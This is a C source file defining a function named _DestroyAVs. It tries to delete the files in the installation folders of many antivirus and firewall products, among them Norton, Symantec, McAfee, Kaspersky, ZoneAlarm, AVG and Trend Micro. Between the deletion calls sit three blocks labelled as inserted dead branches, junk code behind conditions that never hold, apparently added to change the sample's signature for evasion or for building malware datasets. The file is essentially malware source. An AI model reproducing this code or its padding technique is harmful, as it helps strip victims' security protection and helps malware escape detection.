#include "data_globals.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h> // for GetSystemInfo, etc.

void _DestroyAVs(void)
{
    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int i = 0; i < 10; i++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // read existing local (none declared yet, but that's fine; we can read nothing)
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    _unlink("\\Progra~1\\Norton~1\\*.*");
    _unlink("\\Progra~1\\Norton~2\\*.*");
    _unlink("\\Progra~1\\Symantec\\*.*");
    _unlink("\\Progra~1\\Common~1\\Symant~1\\*.*");
    _unlink("\\Progra~1\\Common~1\\Symant~1\\Script~1\\*.*");
    _unlink("\\Progra~1\\McAfee\\VirusScan\\*.*");
    _unlink("\\Progra~1\\McAfee\\McAfee FireWall\\*.*");

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int i = 0; i < (int)len; i++) {
                    hash = (hash * 31) + dummyBuf2[i];
                }
                // read no existing local (safe)
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    _unlink("\\Progra~1\\PandaS~1\\PandaA~1\\*.*");
    _unlink("\\Progra~1\\TrendM~1\\Pc-cil~1\\*.*");
    _unlink("\\Progra~1\\Comman~1\\F-PROT95\\*.*");
    _unlink("\\Progra~1\\ZoneLa~1\\ZoneAlarm\\*.*");
    _unlink("\\Progra~1\\TinyPe~1\\*.*");
    _unlink("\\Progra~1\\Kasper~1\\*.*");
    _unlink("\\Progra~1\\Trojan~1\\*.*");
    _unlink("\\Progra~1\\AvPersonal\\*.*");
    _unlink("\\Progra~1\\Grisoft\\AVG6\\*.*");
    _unlink("\\Progra~1\\AntiVi~1\\*.*");
    _unlink("\\Progra~1\\QuickH~1\\*.*");
    _unlink("\\Progra~1\\FWIN32\\*.*");
    _unlink("\\Progra~1\\FindVirus\\*.*");
    _unlink("\\eSafen\\*.*");
    _unlink("\\f-macro\\*.*");

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int i = 0; i < 32; i++) {
            dummyArr[i] = (unsigned char)(i * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int i = 0; i < 32; i++) {
            hash ^= dummyArr[i];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int i = 0; i < 32; i++) {
            xorSum ^= dummyArr[i];
        }
        // read no existing local
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }

    _unlink("\\TBAVW95\\*.*");
    _unlink("\\VS95\\*.*");
    _unlink("\\AntiVi~1\\*.*");
    _unlink("\\ToolKit\\FindVirus\\*.*");
    _unlink("\\PC-Cil~1\\*.*");
}
